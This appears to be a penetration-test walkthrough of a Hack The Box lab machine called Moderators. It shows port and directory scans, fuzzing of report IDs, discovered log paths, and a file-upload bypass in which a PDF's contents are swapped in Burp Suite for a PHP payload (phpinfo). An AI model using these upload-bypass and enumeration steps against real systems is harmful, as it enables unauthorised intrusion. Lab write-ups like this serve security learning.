```console
└─$ nmap -A -p- -T4 -Pn 10.129.99.138     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-07 11:29 CDT
Nmap scan report for 10.129.99.138
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e (RSA)
|   256 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d (ECDSA)
|_  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Moderators
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 674.55 seconds
zsh: segmentation fault  nmap -A -p- -T4 -Pn 10.129.99.138
```

```console
└─$ feroxbuster -u http://10.129.99.138 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
200      GET      295l      683w        0c http://10.129.99.138/
403      GET        9l       28w      278c http://10.129.99.138/.php
403      GET        9l       28w      278c http://10.129.99.138/.html
301      GET        9l       28w      313c http://10.129.99.138/logs => http://10.129.99.138/logs/
200      GET      283l      990w        0c http://10.129.99.138/blog.php
301      GET        9l       28w      315c http://10.129.99.138/images => http://10.129.99.138/images/
200      GET      318l      612w        0c http://10.129.99.138/about.php
301      GET        9l       28w      312c http://10.129.99.138/css => http://10.129.99.138/css/
200      GET      267l      555w        0c http://10.129.99.138/contact.php
200      GET      295l      683w        0c http://10.129.99.138/index.php
302      GET      226l      417w     7888c http://10.129.99.138/reports.php => index.php
200      GET      249l      596w        0c http://10.129.99.138/service.php
301      GET        9l       28w      317c http://10.129.99.138/logs/css => http://10.129.99.138/logs/css/
301      GET        9l       28w      320c http://10.129.99.138/images/blog => http://10.129.99.138/images/blog/
301      GET        9l       28w      321c http://10.129.99.138/logs/uploads => http://10.129.99.138/logs/uploads/
200      GET        0l        0w        0c http://10.129.99.138/logs/index.html
200      GET        0l        0w        0c http://10.129.99.138/images/index.html
200      GET        0l        0w        0c http://10.129.99.138/css/index.html
403      GET        9l       28w      278c http://10.129.99.138/logs/.php
403      GET        9l       28w      278c http://10.129.99.138/logs/.html
200      GET        0l        0w        0c http://10.129.99.138/logs/uploads/index.html
200      GET        0l        0w        0c http://10.129.99.138/images/blog/index.html
200      GET        0l        0w        0c http://10.129.99.138/logs/css/index.html
403      GET        9l       28w      278c http://10.129.99.138/images/.php
403      GET        9l       28w      278c http://10.129.99.138/images/.html
403      GET        9l       28w      278c http://10.129.99.138/server-status
302      GET        0l        0w        0c http://10.129.99.138/send_mail.php => /contact.php?msg=Email sent
Scanning: http://10.129.99.138
Scanning: http://10.129.99.138/
Scanning: http://10.129.99.138/logs
Scanning: http://10.129.99.138/images
Scanning: http://10.129.99.138/css
Scanning: http://10.129.99.138/logs/css
Scanning: http://10.129.99.138/images/blog
Scanning: http://10.129.99.138/logs/uploads
```

```console
└─$ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt  -u http://10.129.99.138/reports.php?report=FUZZ -v -fs 0 -fw 3091 -fc 302 -c -s
2589
3478
4221
7612
8121
9798
```

```
 Report #9798

# Disclosure Information [+] Domain : bethebest101.uk.htb
[+] Vulnerability : Sensitive Information Disclosure
[+] Impact : 3.5/4.0
[+] Disclosed by : Karlos Young
[+] Disclosed on : 11/19/2021
[+] Posted on :
[+] Approved :
[+] Patched : NO
[+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/
```

```
└─$ feroxbuster -u http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
301      GET        9l       28w      346c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed => http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/
403      GET        9l       28w      278c http://10.129.99.138/logs/.php
403      GET        9l       28w      278c http://10.129.99.138/logs/.html
200      GET      219l      806w    10059c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf
200      GET        0l        0w        0c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/index.html
Scanning: http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed
```

e21cece511f43a5cb18d4932429915ed=9798
743c41a921516b04afde48bb48e28ce6=2589
b071cfa81605a94ad80cfa2bbc747448=3478
b071cfa81605a94ad80cfa2bbc747448=4221
ce5d75028d92047a9ec617acb9c34ce6=7612
afecc60f82be41c1b52f6705ec69e0f1=8121

http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf

Logs
[01/30/2021] Log file created for report #2589.
[01/30/2021] Report submitted by Sharaf Ahamed.
[02/03/2021] Report accepted.
[02/03/2021] LOG file uploaded from /logs/report_log_upload.php
[02/04/2021] Reported to the site administrators.
[02/05/2021] Posting approval sent to the owners.
[02/07/2021] Approval pending......






Wget one of the logs.pdf files and upload it from the page.

Then capture in burpsuite and edit out the pdf content with our own payload.



![image](https://user-images.githubusercontent.com/105310322/194648359-03a0333b-00f3-467f-9306-0353c31b93fe.png)



<?php
phpinfo();

![image](https://user-images.githubusercontent.com/105310322/194648168-1e62ad99-1e4f-4fe7-993b-7bdf3a2a6a34.png)
